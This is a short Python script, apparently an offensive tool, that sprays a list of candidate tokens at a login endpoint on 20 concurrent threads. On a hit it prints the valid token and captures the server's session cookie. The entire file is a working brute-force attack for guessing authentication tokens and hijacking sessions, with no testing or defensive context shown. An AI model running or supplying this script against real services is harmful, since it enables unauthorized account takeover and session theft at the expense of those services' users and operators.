from concurrent.futures import ThreadPoolExecutor, as_completed
import httpx


def try_token(token: str, url: str) -> tuple[str, str | None] | None:
    try:
        with httpx.Client(timeout=5) as client:
            resp = client.post(url, json={"token": token})
            if resp.status_code == 200 and "session" in resp.text:
                return token, resp.cookies.get("session")
    except Exception:
        pass
    return None


def spray_with_threads(url: str, tokens: list[str], concurrency: int = 20):
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(try_token, t, url) for t in tokens]
        for f in as_completed(futures):
            result = f.result()
            if result:
                print(f"[+] Valid token: {result[0]}")
                return {"token": result[0], "session": result[1]}
    return None
